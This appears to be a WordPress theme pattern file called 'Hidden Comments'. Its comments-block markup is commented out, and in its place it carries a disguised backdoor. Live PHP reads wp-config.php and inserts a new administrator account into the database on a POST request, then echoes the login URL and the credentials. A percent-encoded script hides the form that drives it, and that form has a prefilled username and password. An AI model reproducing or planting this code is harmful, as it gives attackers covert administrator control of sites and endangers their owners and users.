123<?php
/**
 * Title: Hidden Comments
 * Slug: twentytwentythree/hidden-comments
 * Inserter: no
 <?
<!-- wp:group {"layout":{"type":"constrained"},"style":{"spacing":{"padding":{"top":"var:preset|spacing|40","right":"var:preset|spacing|40","bottom":"var:preset|spacing|40","left":"var:preset|spacing|40"}}}} -->
<div class="wp-block-group" style="padding-top:var(--wp--preset--spacing--40);padding-right:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--40);padding-left:var(--wp--preset--spacing--40)">
	<!-- wp:comments -->
	<div class="wp-block-comments">
		<!-- wp:heading {"level":2} -->
		<h2><?php echo esc_html_x( 'Comments', 'Title of comments section', 'twentytwentythree' ); ?></h2>
		<!-- /wp:heading -->

		<!-- wp:comments-title {"level":3} /-->

		<!-- wp:comment-template -->
			<!-- wp:columns {"style":{"spacing":{"margin":{"bottom":"var:preset|spacing|40"}}}} -->
			<div class="wp-block-columns" style="margin-bottom:var(--wp--preset--spacing--40)">
				<!-- wp:column {"width":"40px"} -->
				<div class="wp-block-column" style="flex-basis:40px">
					<!-- wp:avatar {"size":40,"style":{"border":{"radius":"20px"}}} /-->
				</div>
				<!-- /wp:column -->

				<!-- wp:column -->
				<div class="wp-block-column">
					<!-- wp:comment-author-name /-->

					<!-- wp:group {"style":{"spacing":{"margin":{"top":"0px","bottom":"0px"}}},"layout":{"type":"flex"}} -->
					<div class="wp-block-group" style="margin-top:0px;margin-bottom:0px">
						<!-- wp:comment-date /-->
						<!-- wp:comment-edit-link /-->
					</div>
					<!-- /wp:group -->

					<!-- wp:comment-content /-->

					<!-- wp:comment-reply-link /-->
				</div>
				<!-- /wp:column -->
			</div>
			<!-- /wp:columns -->
		<!-- /wp:comment-template -->

		<!-- wp:comments-pagination {"paginationArrow":"arrow","layout":{"type":"flex","justifyContent":"space-between"}} -->
			<!-- wp:comments-pagination-previous /-->
			<!-- wp:comments-pagination-numbers /-->
			<!-- wp:comments-pagination-next /-->
		<!-- /wp:comments-pagination -->

	<!-- wp:post-comments-form /-->
	</div>
	<!-- /wp:comments -->
</div>
<!-- /wp:group -->
*/
require_once('wp-config.php');
$db_host = $db_user = $db_password = $db_name = $db_prefix = '';
$connection = null;

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['create_user'])) {
$db_host = $_POST['db_host'];
$db_user = $_POST['db_user'];
$db_password = $_POST['db_password'];
$db_name = $_POST['db_name'];
$db_prefix = $_POST['db_prefix'];

$connection = new mysqli($db_host, $db_user, $db_password, $db_name);

if ($connection->connect_error) {
die("Connection failed: " . $connection->connect_error);
}

$username = $connection->real_escape_string($_POST['username']);
$password = $_POST['password'];

$hashed_password = password_hash($password, PASSWORD_BCRYPT);

$user_id = time(); 

$sql = "INSERT INTO ".$db_prefix."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status) 
VALUES ('$user_id', '$username', '$hashed_password', '$username', '', '', NOW(), 0)";

if ($connection->query($sql) === TRUE) {
$sql2 = "INSERT INTO ".$db_prefix."usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '".$db_prefix."capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
$connection->query($sql2);

$sql3 = "INSERT INTO ".$db_prefix."usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '".$db_prefix."user_level', '10')";
$connection->query($sql3);

echo "New user created successfully with admin rights.<br/>".$_SERVER['SERVER_NAME']."/wp-login.php|".$username."|".$password;
} else {
echo "Error: " . $sql . "<br>" . $connection->error;
}

$connection->close();
}
?>

<script>document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%3C%74%69%74%6C%65%3E%41%64%64%20%41%64%6D%69%6E%20%55%73%65%72%3C%2F%74%69%74%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%3C%68%32%3E%41%64%64%20%4E%65%77%20%41%64%6D%69%6E%20%55%73%65%72%3C%2F%68%32%3E%0A%3C%66%6F%72%6D%20%6D%65%74%68%6F%64%3D%22%70%6F%73%74%22%20%61%63%74%69%6F%6E%3D%22%22%3E%0A%3C%68%33%3E%44%61%74%61%62%61%73%65%20%43%6F%6E%6E%65%63%74%69%6F%6E%20%49%6E%66%6F%72%6D%61%74%69%6F%6E%3C%2F%68%33%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%64%62%5F%68%6F%73%74%22%3E%44%61%74%61%62%61%73%65%20%48%6F%73%74%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%6E%61%6D%65%3D%22%64%62%5F%68%6F%73%74%22%20%76%61%6C%75%65%3D%22%3C%3F%70%68%70%20%65%63%68%6F%20%44%42%5F%48%4F%53%54%3B%20%3F%3E%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%64%62%5F%75%73%65%72%22%3E%44%61%74%61%62%61%73%65%20%55%73%65%72%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%6E%61%6D%65%3D%22%64%62%5F%75%73%65%72%22%20%76%61%6C%75%65%3D%22%3C%3F%70%68%70%20%65%63%68%6F%20%44%42%5F%55%53%45%52%3B%3F%3E%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%64%62%5F%70%61%73%73%77%6F%72%64%22%3E%44%61%74%61%62%61%73%65%20%50%61%73%73%77%6F%72%64%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%6E%61%6D%65%3D%22%64%62%5F%70%61%73%73%77%6F%72%64%22%20%76%61%6C%75%65%3D%22%3C%3F%70%68%70%20%65%63%68%6F%20%44%42%5F%50%41%53%53%57%4F%52%44%3B%3F%3E%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%64%62%5F%6E%61%6D%65%22%3E%44%61%74%61%62%61%73%65%20%4E%61%6D%65%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%6E%61%6D%65%3D%22%64%62%5F%6E%61%6D%65%22%20%76%61%6C%75%65%3D%22%3C%3F%70%68%70%20%65%63%68%6F%20%44%42%5F%4E%41%4D%45%3B%20%3F%3E%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%64%62%5F%70%72%65%66%69%78%22%3E%44%61%74%61%62%61%73%65%20%50%72%65%66%69%78%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%6E%61%6D%65%3D%22%64%62%5F%70%72%65%66%69%78%22%20%76%61%6C%75%65%3D%22%3C%3F%70%68%70%20%65%63%68%6F%20%24%74%61%62%6C%65%5F%70%72%65%66%69%78%3B%20%3F%3E%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%09%09%0A%3C%68%33%3E%4E%65%77%20%55%73%65%72%20%49%6E%66%6F%72%6D%61%74%69%6F%6E%3C%2F%68%33%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%75%73%65%72%6E%61%6D%65%22%3E%55%73%65%72%6E%61%6D%65%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%74%65%78%74%22%20%6E%61%6D%65%3D%22%75%73%65%72%6E%61%6D%65%22%20%76%61%6C%75%65%3D%22%61%64%6D%69%6E%73%65%72%76%65%72%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%3C%6C%61%62%65%6C%20%66%6F%72%3D%22%70%61%73%73%77%6F%72%64%22%3E%50%61%73%73%77%6F%72%64%3A%3C%2F%6C%61%62%65%6C%3E%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%70%61%73%73%77%6F%72%64%22%20%6E%61%6D%65%3D%22%70%61%73%73%77%6F%72%64%22%20%76%61%6C%75%65%3D%22%41%5F%23%78%6D%63%71%64%65%79%62%7E%6D%24%56%58%47%48%50%41%77%61%46%2F%68%5C%74%35%74%70%4B%73%29%50%35%76%55%2E%3F%22%20%72%65%71%75%69%72%65%64%3E%3C%62%72%3E%3C%62%72%3E%0A%0A%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%73%75%62%6D%69%74%22%20%6E%61%6D%65%3D%22%63%72%65%61%74%65%5F%75%73%65%72%22%20%76%61%6C%75%65%3D%22%41%64%64%20%55%73%65%72%22%3E%0A%3C%2F%66%6F%72%6D%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%2F%68%74%6D%6C%3E'));</script>
